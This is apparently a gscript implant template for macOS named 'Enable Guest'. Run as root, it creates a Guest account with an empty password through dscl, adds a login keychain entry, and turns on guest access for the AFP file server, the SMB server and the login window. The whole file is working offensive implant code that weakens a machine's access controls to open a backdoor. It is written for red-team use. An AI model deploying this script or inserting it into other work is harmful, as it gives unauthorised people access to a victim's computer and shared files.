// Example gscript template
// Title: Enable Guest
// Author: ahhh
// Purpose: 
// Gscript version: 1.0.0
// ATT&CK: 
// Note: must run implant as root

//go_import:os/user as user

//priority:120
//timeout:150

function Deploy() {  
    console.log("starting execution of Enable Guest");
    // Whoami
    var myuser = user.Current();
    console.log("Our user is: "+Dump(myuser[0]));
    if (myuser[0].Username == "root") {
        G.exec.ExecuteCommand("dscl", [".", "-create", "/Users/Guest"]);
        G.exec.ExecuteCommand("dscl", [".", "-create", "/Users/Guest", "dsAttrTypeNative:_defaultLanguage", "en"]);
        G.exec.ExecuteCommand("dscl", [".", "-create", "/Users/Guest", "dsAttrTypeNative:_guest", "true"]);
        G.exec.ExecuteCommand("dscl", [".", "-create", "/Users/Guest", "dsAttrTypeNative:_writers_defaultLanguage", "Guest"]);
        G.exec.ExecuteCommand("dscl", [".", "-create", "/Users/Guest", "dsAttrTypeNative:_writers_LinkedIdentity", "Guest"]);
        G.exec.ExecuteCommand("dscl", [".", "-create", "/Users/Guest", "dsAttrTypeNative:_writers_UserCertificate", "Guest"]);
        G.exec.ExecuteCommand("dscl", [".", "-create", "/Users/Guest", "AuthenticationHint", ""]);
        G.exec.ExecuteCommand("dscl", [".", "-create", "/Users/Guest", "NFSHomeDirectory", "/Users/Guest"]);
        G.exec.ExecuteCommand("dscl", [".", "-passwd", "/Users/Guest", ""]);
        G.exec.ExecuteCommand("dscl", [".", "-create", "/Users/Guest", "Picture", "/System/Library/CoreServices/CoreTypes.bundle/Contents/Resources/UserIcon.icns"]);
        G.exec.ExecuteCommand("dscl", [".", "-create", "/Users/Guest", "PrimaryGroupID", "201"]);
        G.exec.ExecuteCommand("dscl", [".", "-create", "/Users/Guest", "RealName", "Guest User"]);
        G.exec.ExecuteCommand("dscl", [".", "-create", "/Users/Guest", "RecordName", "Guest"]);
        G.exec.ExecuteCommand("dscl", [".", "-create", "/Users/Guest", "UniqueID", "201"]);
        G.exec.ExecuteCommand("dscl", [".", "-create", "/Users/Guest", "UserShell", "/bin/bash"]);
        G.exec.ExecuteCommand("security", ["add-generic-password", "-A", "-w", "Guest", "-s", "com.apple.loginwindow.guest-account", "-D", "application password", "/Library/Keychains/System.keychain"]);
        var response2 = G.exec.ExecuteCommand("defaults", ["write", "/Library/Preferences/com.apple.AppleFileServer", "guestAccess", "-bool", "true"]);
        console.log("Pid: "+response2[0]);
        console.log("stdout: "+response2[1]);
        console.log("stderr: "+response2[2]);
        console.log("exit code: "+response2[3]);
        console.log("go errors: "+response2[4]);
        var response = G.exec.ExecuteCommand("defaults", ["write", "/Library/Preferences/SystemConfiguration/com.apple.smb.server", "AllowGuestAccess", "-bool", "true"]);
        console.log("Pid: "+response[0]);
        console.log("stdout: "+response[1]);
        console.log("stderr: "+response[2]);
        console.log("exit code: "+response[3]);
        console.log("go errors: "+response[4]);
        var response3 = G.exec.ExecuteCommand("defaults", ["write", "/Library/Preferences/com.apple.loginwindow", "GuestEnabled", "-bool", "YES"]);
        console.log("Pid: "+response3[0]);
        console.log("stdout: "+response3[1]);
        console.log("stderr: "+response3[2]);
        console.log("exit code: "+response3[3]);
        console.log("go errors: "+response3[4]);

        console.log("Done Enable Guest");
    } else {
        console.log("Detected a non-root user, this needs to run as root!");
    } 
    return true;
}

